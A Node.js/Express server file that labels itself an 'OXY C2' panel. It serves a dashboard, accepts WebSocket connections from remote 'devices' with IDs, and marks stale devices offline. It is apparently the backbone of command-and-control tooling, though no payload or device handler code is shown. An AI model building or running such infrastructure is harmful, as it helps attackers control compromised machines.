'use strict';
const http    = require('http');
const path    = require('path');
const express = require('express');
const { WebSocketServer } = require('ws');
const state   = require('./state');

const PORT = parseInt(process.env.PORT || '5000', 10);
const DIST = path.join(__dirname, '..', 'client', 'dist');

const app = express();
app.use(express.json({ limit: '50mb' }));

// ── Static (built React app) ──────────────────────────────────────────────────
app.use(express.static(DIST));

// ── REST API ──────────────────────────────────────────────────────────────────
app.use('/api', require('./routes/api'));

// ── SPA fallback ─────────────────────────────────────────────────────────────
app.get('*', (_, res) => {
  const index = path.join(DIST, 'index.html');
  const fs = require('fs');
  if (fs.existsSync(index)) res.sendFile(index);
  else res.status(200).send('<h2>Run: npm run build --workspace=client</h2>');
});

// ── HTTP server ───────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ── WebSocket servers ─────────────────────────────────────────────────────────
const wssDevice    = new WebSocketServer({ noServer: true });
const wssDashboard = new WebSocketServer({ noServer: true });

const deviceHandler    = require('./ws/device');
const dashboardHandler = require('./ws/dashboard');

wssDevice.on('connection',    deviceHandler.handle);
wssDashboard.on('connection', dashboardHandler.handle);

// Route upgrades by path prefix
server.on('upgrade', (req, socket, head) => {
  const url = req.url || '';
  if (url.startsWith('/ws')) {
    wssDevice.handleUpgrade(req, socket, head, ws => wssDevice.emit('connection', ws, req));
  } else if (url.startsWith('/dashboard')) {
    wssDashboard.handleUpgrade(req, socket, head, ws => wssDashboard.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// ── Stale device cleanup every 30s ───────────────────────────────────────────
setInterval(() => {
  const cutoff = Date.now() - 30_000;
  for (const [id, dev] of state.devices) {
    if (dev.lastSeen < cutoff) {
      state.devices.delete(id);
      require('./db').q.setOffline.run(Date.now(), id);
      state.broadcastAll({ type: 'device_offline', device_id: id, ts: Date.now() });
      console.log(`[STALE] ${id}`);
    }
  }
}, 15_000);

// ── Start ─────────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n╔══════════════════════════════════════╗`);
  console.log(`║   OXY 🦷  C2  —  port ${PORT}            ║`);
  console.log(`╠══════════════════════════════════════╣`);
  console.log(`║  Device WS  : /ws?device_id=XXX     ║`);
  console.log(`║  Dashboard  : /dashboard[?token=X]  ║`);
  console.log(`║  Panel      : http://HOST:${PORT}       ║`);
  console.log(`╚══════════════════════════════════════╝\n`);
});
